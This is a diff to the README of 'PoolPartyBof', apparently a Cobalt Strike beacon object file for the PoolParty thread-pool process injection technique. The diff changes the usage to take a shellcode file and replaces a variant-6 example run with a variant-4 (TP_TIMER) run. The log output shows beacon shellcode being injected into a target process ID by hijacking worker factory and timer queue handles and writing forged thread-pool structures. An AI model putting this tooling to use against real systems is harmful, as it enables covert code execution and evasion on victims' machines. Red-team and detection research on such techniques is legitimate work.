@@ -11,41 +11,41 @@ I will try to keep adding remaining variants.
 
 ## Usage
 ```
-PoolPartyBof <Process ID> <Listener Name> <Variant>
+PoolPartyBof <Process ID> <Path To Shellcode> <Variant>
 ```
 
 - Usage Examples
 
 ```
-PoolPartyBof 3092 HTTPSLocal 6
-[*] Opening 3092 and running PoolParty (6 Varient) with HTTPSLocal listener!
-[+] host called home, sent: 313519 bytes
+ PoolPartyBof 2136 /tmp/beacon_x64.bin 4
+[*] Opening 2136 and running PoolParty with /tmp/beacon_x64.bin shellcode!
+[+] host called home, sent: 314020 bytes
 [+] received output:
-[INFO] 	Shellcode Size: 307204 bytes
+[INFO] 	Shellcode Size: 307200 bytes
 [+] received output:
-[INFO] 	Starting PoolParty attack against process id: 3092
+[INFO] 	Starting PoolParty attack against process id: 2136
 [+] received output:
 [INFO]   Retrieved handle to the target process: 0000000000000670
 [+] received output:
-[INFO]   Hijacked I/O completion handle from the target process: 66c
+[INFO] 	Hijacked worker factory handle from the target process: 000000C96E0FF5B8
 [+] received output:
-[INFO]   Allocated shellcode memory in the target process: 0000021331760000
+[INFO] 	Hijacked timer queue handle from the target process: 000000C96E0FF5B8
+[+] received output:
+[INFO]   Allocated shellcode memory in the target process: 00000290C91B0000
 [+] received output:
 [INFO]   Written shellcode to the target process
 [+] received output:
-[INFO] 	Created job object with name `HDWCJWPZ`
+[INFO] 	Retrieved target worker factory basic information
 [+] received output:
-[INFO] 	Created TP_JOB structure associated with the shellcode
+[INFO] 	Created TP_TIMER structure associated with the shellcode
 [+] received output:
-[INFO] 	Allocated TP_JOB memory in the target process: 00000213313F0000
+[INFO] 	Allocated TP_TIMER memory in the target process: 00000290C9200000 
 [+] received output:
-[INFO] 	Written the specially crafted TP_JOB structure to the target process
+[INFO] 	Written the specially crafted TP_TIMER structure to the target process
 [+] received output:
-[INFO] 	Zeroed out job object `HDWCJWPZ` IO completion port
+[INFO] 	Modified the target process's TP_POOL timer queue WindowsStart and Windows End to point to the specially crafted TP_TIMER
 [+] received output:
-[INFO] 	Associated job object `HDWCJWPZ` with the IO completion port of the target process worker factory
-[+] received output:
-[INFO] 	Assigned current process to job object `HDWCJWPZ` to queue a packet to the IO completion port of the target process worker factory
+[INFO] 	Set the timer queue to expire to trigger the dequeueing TppTimerQueueExpiration
 [+] received output:
 [INFO] 	PoolParty attack completed.
 ```
